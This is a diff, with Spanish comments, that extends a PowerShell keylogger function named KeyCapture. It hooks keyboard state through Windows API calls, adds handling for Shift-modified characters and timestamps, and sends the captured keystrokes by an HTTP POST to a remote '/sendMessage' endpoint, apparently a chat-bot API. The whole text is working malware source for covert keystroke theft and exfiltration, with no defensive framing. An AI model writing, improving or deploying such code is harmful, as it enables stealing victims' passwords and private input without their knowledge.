@@ -41,19 +41,33 @@ Function KeyCapture {
                         $kbst = New-Object Byte[] 256
                         $checkkbst = $API::GetKeyboardState($kbst)
                         $logchar = New-Object -TypeName System.Text.StringBuilder
+
+                        # Verificamos si Shift está presionado
+                        $shiftPressed = ($kbst[160] -band 0x80) -eq 0x80 -or ($kbst[161] -band 0x80) -eq 0x80
+
                         if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                             $LString = $logchar.ToString()
 
-                            # Si la tecla es Backspace (código 8), eliminamos el último carácter
-                            if ($asc -eq 8) {
-                                $capturedKeys = $capturedKeys.Substring(0, $capturedKeys.Length - 1)
-                            } 
-                            # Si la tecla es Enter (código 13), añadimos un salto de línea
-                            elseif ($asc -eq 13) {
-                                $capturedKeys += "`n"
+                            # Si Shift está presionado, el código de la tecla puede generar caracteres especiales
+                            if ($shiftPressed) {
+                                # Aquí es donde manejamos las teclas modificadas como @, *, etc.
+                                if ($asc -eq 2) { $LString = "@" }
+                                elseif ($asc -eq 8) { $LString = "[BKSP]" }
+                                elseif ($asc -eq 13) { $LString = "`n" }
+                                # Otros caracteres especiales que puedan requerir Shift (como '*', '#', etc.)
+                                elseif ($asc -eq 56) { $LString = "*" }
+                                elseif ($asc -eq 51) { $LString = "#" }
                             }
-                            # Si la tecla no es especial, la añadimos tal cual
-                            else {
+
+                            # Actualizamos el texto capturado con la tecla actual
+                            if ($asc -eq 8) {
+                                # Si es Backspace, eliminamos el último carácter
+                                $capturedKeys = $capturedKeys.Substring(0, $capturedKeys.Length - 1)
+                            } elseif ($asc -eq 13) {
+                                # Si es Enter, añadimos un salto de línea
+                                $capturedKeys += "`n"
+                            } else {
+                                # Añadimos cualquier otro carácter
                                 $capturedKeys += $LString
                             }
                         }
@@ -64,7 +78,10 @@ Function KeyCapture {
             if ($keyPressed) {
                 # Si hay teclas capturadas, las enviamos
                 if ($capturedKeys.Length -gt 0) {
-                    $escmsg = "Keys Captured: " + $capturedKeys
+                    # Agregar timestamp al mensaje
+                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    $escmsg = "Keys Captured at $timestamp: " + $capturedKeys
+
                     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$escmsg" -Force
                     irm -Method Post -Uri ($URL + '/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
                     $capturedKeys = ""
